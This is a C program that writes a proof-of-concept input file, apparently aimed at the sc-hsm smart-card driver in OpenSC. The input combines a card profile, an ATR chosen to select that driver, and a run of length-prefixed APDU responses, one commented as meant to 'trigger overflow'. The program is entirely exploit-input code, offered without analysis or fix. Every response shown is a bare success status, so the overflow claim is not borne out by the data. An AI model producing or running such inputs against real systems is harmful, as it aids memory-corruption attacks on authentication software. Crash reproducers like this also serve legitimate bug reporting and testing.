#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    // Part 1: Valid scconf profile (null-terminated)
    fprintf(f, "[card]\n");
    fprintf(f, "driver = sc-hsm\n");
    fprintf(f, "[newfile]\n");
    fprintf(f, "type = data\n");
    fprintf(f, "file-id = 0x0001\n");
    fprintf(f, "[tokeninfo]\n");
    fprintf(f, "label = test\n");
    fputc(0x00, f); // Null separator

    // Part 2: Reader binary data
    // ATR: 12 bytes length + 12 bytes ATR (matching SC-HSM driver)
    fputc(0x0C, f); // ATR length (12 bytes)
    // Write 12-byte ATR that maps to sc-hsm driver
    fputc(0x3B, f);
    fputc(0x7F, f);
    fputc(0x96, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);

    // Driver name: null-terminated
    fprintf(f, "sc-hsm");
    fputc(0x00, f);

    // APDU responses with length prefixes (2-byte big-endian length before each response)
    // Each response block: [2-byte length][SW1][SW2][optional data]
    // Provide enough responses for initialization sequence (SELECT, READ, UPDATE, etc.)
    // Response 1: SELECT FILE success (0x90 0x00)
    fputc(0x00, f); fputc(0x02, f); // Length = 2
    fputc(0x90, f); fputc(0x00, f);

    // Response 2: READ BINARY success (return some data)
    fputc(0x00, f); fputc(0x02, f); // Length = 2
    fputc(0x90, f); fputc(0x00, f);

    // Response 3: UPDATE BINARY success (trigger overflow)
    fputc(0x00, f); fputc(0x02, f); // Length = 2
    fputc(0x90, f); fputc(0x00, f);

    // Additional responses for other commands
    for (int i = 0; i < 10; i++) {
        fputc(0x00, f); fputc(0x02, f);
        fputc(0x90, f); fputc(0x00, f);
    }

    fclose(f);
    return 0;
}